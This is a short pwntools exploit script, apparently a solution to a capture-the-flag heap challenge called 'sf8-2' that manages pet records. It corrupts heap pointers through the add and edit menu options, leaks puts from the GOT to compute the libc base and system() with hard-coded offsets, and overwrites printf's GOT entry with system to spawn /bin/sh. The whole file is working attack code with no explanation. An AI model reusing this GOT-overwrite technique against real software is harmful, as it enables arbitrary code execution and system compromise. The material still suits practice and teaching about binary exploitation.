from pwn import * 

p = process("./sf8-2")
e = ELF("./sf8-2")

# context.log_level = 'debug'

def add(name, kind, age):
    p.recvuntil("> ")
    p.sendline("1")
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", str(age))
    
def edit(index, name, kind, age, y_n):
    p.recvuntil("> ")
    p.sendline("2")
    p.sendafter("> ", str(index))
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", str(age))
    p.sendafter("> ", y_n)

def print_menu(index):
    p.recvuntil("> ")
    p.sendline("3")
    p.sendafter("> ", str(index))

idx_2 = 0x6020b0
    
add("A", "A", 1)
edit(0, "B", "B", 1, "n")
add("C", p64(idx_2) + p64(e.bss() + 100), 2)

edit(0, p64(e.bss() + 100), p64(e.got['puts']), 3, "y")

print_menu(2)
p.recvuntil("name: ")
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak + 0x35a960 
system = libc_base + 0x45390

print(hex(leak))
print(hex(libc_base))

edit(0, "A", "A", 4, "n")
add("A", p64(e.got['printf']) + p64(e.bss() + 50), 5)

input()

p.sendafter("> ", "2")
p.sendafter("> ", "0")
p.sendafter("> ", p64(system))
p.sendafter("> ", p64(e.bss() + 50))
p.sendafter("> ", "/bin/sh\x00")

# edit(0, p64(system), p64(e.bss() + 50), b"sh\x00", "y") 

p.interactive()

